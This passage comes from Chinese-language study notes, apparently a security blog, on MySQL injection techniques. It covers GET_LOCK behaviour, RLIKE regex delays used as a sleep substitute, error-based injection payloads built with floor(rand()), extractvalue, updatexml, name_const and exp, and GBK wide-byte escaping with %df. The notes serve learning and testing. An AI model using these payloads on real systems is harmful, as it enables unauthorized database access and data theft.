IS_FREE_LOCK(key) 返回当前连接ID，表示名称为&rsquo;xxxx&rsquo;的锁正在被使用。
key 锁的名字，timeout加锁等待时间，时间内未加锁成功则事件回滚。get_lock 加锁成功返回1，
这个锁是应用程序级别的，在不同的mysql会话之间使用，是名字锁，不是锁具体某个表名或字段，具体是锁什么完全交给应用程序。它是一种独占锁，意味着哪个会话持有这个锁，其他会话尝试拿这个锁的时候都会失败。
session A select get_lock(&rsquo;test&rsquo;,1);
session B select get_lock(&rsquo;test&rsquo;,5);
可以指定表也可以不指定
直到关闭连接会话结束，锁才会释放，但不像redis那样加了锁只要不主动释放就一直有。
但是当会话1 get_lock 后，未释放。会话2 不get_lock 同一个key，或者就不get_lock,依然可以对数据进行任何操作，所以加锁只是说人为的主观的想要让某些操作同时只有一个连接能进行操作，别的连接不调用get_lock加同一个锁，那它不会受到任何影响，想干什么干什么。</p>
<p>session1</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221863.webp" alt="image-20230721222137114" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221863.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221863.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221863.webp?size=large 2x" data-title="image-20230721222137114" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>session2</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221683.webp" alt="image-20230721222155415" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221683.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221683.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212221683.webp?size=large 2x" data-title="image-20230721222155415" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>get_lock：但是当会话1 get_lock 后，未释放。会话2 不get_lock 同一个key，或者就不get_lock,依然可以对数据进行任何操作，所以加锁只是说人为的主观的想要让某些操作同时只有一个连接能进行操作，别的连接不调用get_lock加同一个锁，那它不会受到任何影响，想干什么干什么。</p>
<p>session1</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222405.webp" alt="image-20230721222226072" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222405.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222405.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222405.webp?size=large 2x" data-title="image-20230721222226072" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>session2</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222810.webp" alt="image-20230721222245207" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222810.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222810.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212222810.webp?size=large 2x" data-title="image-20230721222245207" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>优缺点分析 （1）这种方式对于更新所有列比较有效，但是得把查询的语句也放在锁内执行； （2）这种方式当客户端无故断线了会自动释放锁，比较好，不像redis锁那样，如果加完锁断了，那么锁一直在； （3）这种方式是针对锁内的所有操作加锁，并不针对特定表或特定行，所以使用了同一个Key的锁但不同的操作都会共用一把锁，会导致效率低下； （4）如果查询语句放在锁之前，则数据可能是旧的，更新之后会把查询之后更新之前别的客户端更新的数据覆盖掉；</p>
<h3 id="rlike正则" class="heading-element"><span>RLIKE正则</span>
  <a href="#rlike%e6%ad%a3%e5%88%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
<pre tabindex="0"><code> select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);
 
 正则语法：
 . : 匹配任意单个字符
 * ： 匹配0个或多个前一个得到的字符
 [] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。
 ^ : 匹配开头，如^s匹配以s或者S开头的字符串。
 $ : 匹配结尾，如s$匹配以s结尾的字符串。
 {n} : 匹配前一个字符反复n次。

 RPAD(str,len,padstr)
 用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#39;，那么它将被截除到 len个字符。
 mysql&gt; SELECT RPAD(&#39;hi&#39;,5,&#39;?&#39;); -&gt; &#39;hi???&#39;
 
 repeat(str,times)  复制字符串times次</code></pre><h3 id="寻找新的延迟函数" class="heading-element"><span>寻找新的延迟函数</span>
  <a href="#%e5%af%bb%e6%89%be%e6%96%b0%e7%9a%84%e5%bb%b6%e8%bf%9f%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</code></pre><p>以上代码等同于 <code>sleep(5)</code></p>
<h2 id="报错" class="heading-element"><span>报错</span>
  <a href="#%e6%8a%a5%e9%94%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><code>常用函数</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#58a1dd">rand</span>()  <span style="color:#58a1dd">产生一个不固定的0</span><span style="color:#ff636f">~</span><span style="color:#a6be9d">1</span><span style="color:#58a1dd">的随机数列，加了参数之后会变成固定的伪随机数列</span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">rand</span>(<span style="color:#a6be9d">0</span>),<span style="color:#58a1dd">rand</span>(<span style="color:#a6be9d">1</span>)<span style="color:#58a1dd">，当使用一个整数参数时，rand使用该参数作为种子生成一个固定的伪随机数列</span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">floor</span>  <span style="color:#58a1dd">向下取整</span> <span style="color:#58a1dd">floor</span>(<span style="color:#a6be9d">2.5</span>) <span style="color:#ff636f">==</span> <span style="color:#a6be9d">2</span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">count</span>()<span style="color:#58a1dd">统计元组的个数</span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">concat</span>() <span style="color:#58a1dd">字符串连接</span> <span style="color:#58a1dd">concat</span>(<span style="color:#a6be9d">&#39;~~&#39;</span>,<span style="color:#a6be9d">&#39;aaa&#39;</span>,<span style="color:#a6be9d">&#39;bbb&#39;</span>,) <span style="color:#ff636f">=&gt;</span><span style="color:#a6be9d">&#39;aaa~~bbb&#39;</span> 
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">concat_ws</span>() <span style="color:#58a1dd">字符串连接</span> <span style="color:#58a1dd">concat_ws</span>(<span style="color:#a6be9d">&#39;~~&#39;</span>,<span style="color:#a6be9d">&#39;aaa&#39;</span>,<span style="color:#a6be9d">&#39;bbb&#39;</span>,) <span style="color:#ff636f">=&gt;</span><span style="color:#a6be9d">&#39;aaa~~bbb&#39;</span>   
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">extractvalue</span>(<span style="color:#58a1dd">最长32位</span>)	<span style="color:#58a1dd">MySQL</span> <span style="color:#a6be9d">5.1</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">5</span><span style="color:#58a1dd">版本中添加了对XML文档进行查询和修改的函数，分别是</span> <span style="color:#58a1dd">ExtractValue</span>()<span style="color:#58a1dd">和</span> 
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">updateXml</span>(<span style="color:#58a1dd">最长32位</span>)
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">name_const</span>()<span style="color:#ff636f">:</span> <span style="color:#58a1dd">mysql存储过程中的本地变量会被一个内部函数</span> <span style="color:#58a1dd">name_const</span> <span style="color:#58a1dd">转化</span>,<span style="color:#58a1dd">似乎是专门为存储过程设计的</span>,<span style="color:#58a1dd">没有提到有其它特别之处</span><span style="color:#ff636f">.</span> 	
</span></span></code></pre></div><p><code>姿势</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.利用 <span style="color:#58a1dd">floor</span>(<span style="color:#58a1dd">rand</span>(<span style="color:#58a1dd">x</span>)<span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span>) 的执行<span style="color:#58a1dd">bug进行报错注入</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">concat</span>((查询语句),<span style="color:#58a1dd">floor</span>(<span style="color:#58a1dd">rand</span>(<span style="color:#a6be9d">0</span>)<span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span>))
</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#34; union select 1,count(*),concat((查询语句),floor(rand(0)*2))a from information_schema.columns group by a#
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">?id=1&#34;</span> <span style="color:#ff636f">and</span> (<span style="color:#ff636f">select</span> <span style="color:#a6be9d">1</span> <span style="color:#ff636f">from</span>(<span style="color:#ff636f">select</span> <span style="color:#ff636f">count</span>(<span style="color:#ff636f">*</span>),<span style="color:#58a1dd">concat</span>((查询语句),<span style="color:#58a1dd">floor</span>(<span style="color:#58a1dd">rand</span>(<span style="color:#a6be9d">0</span>)<span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span>))<span style="color:#58a1dd">x</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">tables</span> <span style="color:#ff636f">group</span> <span style="color:#ff636f">by</span> <span style="color:#58a1dd">x</span>)<span style="color:#58a1dd">a</span>)<span style="color:#ff636f">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.报错函数
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#34; and extractvalue(1,concat(0x7e,(查询语句)))#
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">1 and updatexml(1,concat(0x7e,(查询语句),0x7e),1)#
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">3.name_const
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">1&#34;</span> <span style="color:#ff636f">union</span> <span style="color:#ff636f">select</span> <span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span> <span style="color:#ff636f">from</span> (<span style="color:#ff636f">select</span> <span style="color:#58a1dd">name_const</span>((查询语句),<span style="color:#a6be9d">1</span>),<span style="color:#58a1dd">name_const</span>((查询语句),<span style="color:#a6be9d">1</span>))<span style="color:#58a1dd">x</span> <span style="color:#ff636f">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span>.<span style="color:#58a1dd">double</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#34; union select (exp(~(select * from(select user())a))),2,3#
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">5.bright
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">1&#34;</span> <span style="color:#ff636f">union</span> <span style="color:#ff636f">select</span> (<span style="color:#ff636f">!</span>(<span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> (<span style="color:#ff636f">select</span> <span style="color:#ff636f">user</span>())<span style="color:#58a1dd">x</span>) <span style="color:#ff636f">-</span> <span style="color:#ff636f">~</span><span style="color:#a6be9d">0</span>),<span style="color:#a6be9d">2</span>,<span style="color:#a6be9d">3</span><span style="color:#ff636f">#</span></span></span></code></pre></div><h1 id="宽字节" class="heading-element"><span>宽字节</span>
  <a href="#%e5%ae%bd%e5%ad%97%e8%8a%82" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><a href="https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/"target="_blank" rel="external nofollow noopener noreferrer">https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/</a></p>
<h2 id="简略" class="heading-element"><span>简略</span>
  <a href="#%e7%ae%80%e7%95%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>1%df&rsquo; or 1=1%23</p>
<p>当单引号被转义，但数据库使用的编码是gbk编码（两个字节表示一个字符的时候），==%df会与反斜杠闭合形成一个新的字符从而闭合单引号==。</p>
<blockquote>
<p>username = %df’</p>
<p><em>#</em> 经gbk解码后变为：</p>
<p>select * from users where username =’運’#</p>
</blockquote>
<h2 id="1宽字节概念" class="heading-element"><span>1、宽字节概念</span>
  <a href="#1%e5%ae%bd%e5%ad%97%e8%8a%82%e6%a6%82%e5%bf%b5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>宽字节是相对于ascII这样单字节而言的；像 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节</p>
<p>GBK 是一种多字符的编码，通常来说，一个 gbk 编码汉字，占用2个字节。一个 utf-8 编码的汉字，占用3个字节</p>
<p>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string 等，还有一种是配置magic_quote_gpc，不过 PHP 高版本已经移除此功能。</p>
<p>宽字节注入时==利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字==</p>
<h2 id="2addslashes函数" class="heading-element"><span>2、addslashes()函数</span>
  <a href="#2addslashes%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>1、addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>2、预定义字符：单引号（&rsquo;），双引号（&quot;），反斜杠（\），NULL</p>
<h2 id="3-sql的执行过程" class="heading-element"><span>3. SQL的执行过程</span>
  <a href="#3-sql%e7%9a%84%e6%89%a7%e8%a1%8c%e8%bf%87%e7%a8%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>
<p>以 php 客户端为例，使用者输入数据后，会==通过php的默认编码生成sql语句发送给服务器==。在php没有开启default_charset编码时，php的默认编码为空。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081137496.webp" alt="image-20240108113753876" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081137496.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081137496.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081137496.webp?size=large 2x" data-title="image-20240108113753876" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
<li>
<p>服务器接收到请求后会==把客户端编码的字符串转换成连接层编码字符串==（具体流程是先使用系统变量 character_set_client 对 SQL 语句进行解码后，然后使用 系统变量 character_set_connection 对解码后的十六进制进行编码）。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138463.webp" alt="image-20240108113817814" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138463.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138463.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138463.webp?size=large 2x" data-title="image-20240108113817814" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
<li>
<p>进行内部操作前，将请求按照如下规则转化成内部操作字符集，如下：</p>
<ul>
<li>
<p>使用字段 CHARACTER SET 设定值；</p>
</li>
<li>
<p>若上述值不存在，使用对应数据表的DEFAULT CHARACTER SET设定值；</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138633.webp" alt="image-20240108113857981" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138633.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138633.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081138633.webp?size=large 2x" data-title="image-20240108113857981" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
<li>
<p>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</p>
</li>
<li>
<p>若上述值不存在，则使用character_set_server设定值。</p>
</li>
</ul>
</li>
<li>
<p>执行完 SQL 语句之后，将==执行结果按照 character_set_results 编码进行输出==。</p>
</li>
</ol>
<h2 id="4-宽字节注入" class="heading-element"><span>4. 宽字节注入</span>
  <a href="#4-%e5%ae%bd%e5%ad%97%e8%8a%82%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>简单的说有两种情况可能会造成宽字节注入</p>
<p>首先是设置数据库的字符集为gbk，此外是在使用iconv,mb_convert_encoding转换字符编码函数导致宽字节注入</p>
</blockquote>
<p>宽字节注入指的是 mysql 数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为&rsquo;，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081139972.webp" alt="image-20240108113947278" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081139972.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081139972.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401081139972.webp?size=large 2x" data-title="image-20240108113947278" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
